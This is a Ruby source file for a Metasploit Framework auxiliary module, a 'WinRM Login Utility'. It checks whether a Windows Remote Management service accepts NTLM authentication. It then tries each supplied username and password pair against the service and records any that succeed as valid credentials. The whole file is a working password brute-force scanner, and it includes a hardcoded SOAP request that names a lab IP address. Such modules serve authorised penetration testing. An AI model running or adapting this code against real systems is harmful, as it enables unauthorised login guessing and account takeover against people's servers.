##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/ntlm/message'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::WinRM
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'WinRM Login Utility',
			'Version'        => '$Revision$',
			'Description'    => 'This module attempts to authenticate to a WinRM service.',
			'References'  =>
				[

				],
			'Author'         => [ 'thelightcosine' ],
			'References'     =>
				[
					[ 'CVE', '1999-0502'] # Weak password
				],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('URI', [ true, "The URI of the WinRM service", "/wsman" ])
			], self.class)
		register_autofilter_ports([ 5985,5986 ])
	end


	def run_host(ip)
		unless accepts_ntl_auth
			print_error "The Remote WinRM  server  (#{ip} does not appear to allow Negotiate(NTLM) auth"
			return
		end
		each_user_pass do |user, pass|
			opts = {
				'uri' => datastore['URI'],
				'data' => test_request,
				'username' => user,
				'password' => pass
			}
			resp,c = send_request_ntlm(opts)
			if resp.code == 200
				cred_hash = {
					:host              => ip,
					:port              => rport,
					:sname          => 'winrm',
					:pass              => pass,
					:user              => user,
					:source_type => "user_supplied",
					:active            => true
				}
				report_auth_info(cred_hash)
				print_good "Valid credential found: #{user}:#{pass}"
			elsif resp.code == 401
				print_error "Login failed: #{user}:#{pass}"
			else
				print_error "Recieved unexpected Response Code: #{resp.code}"
			end
		end
	end

	def accepts_ntl_auth
		 parse_auth_methods(winrm_poke).include? "Negotiate"
	end

	def test_request
		data = %q|<?xml version="1.0" encoding="UTF-8"?><env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config"><env:Header><a:To>http://172.16.221.145:5985/wsman</a:To><a:ReplyTo><a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo><w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize><a:MessageID>uuid:BE2777BF-0AF2-41E5-A15C-E8A4403DEFD8</a:MessageID><w:Locale xml:lang="en-US" mustUnderstand="false"/><p:DataLocale xml:lang="en-US" mustUnderstand="false"/><w:OperationTimeout>PT60S</w:OperationTimeout><w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/*</w:ResourceURI><a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate</a:Action></env:Header><env:Body><n:Enumerate><w:OptimizeEnumeration xsi:nil="true"/><w:MaxElements>32000</w:MaxElements><w:Filter Dialect="http://schemas.microsoft.com/wbem/wsman/1/WQL">select Name,Status from Win32_Service</w:Filter></n:Enumerate></env:Body></env:Envelope>|
	end

end
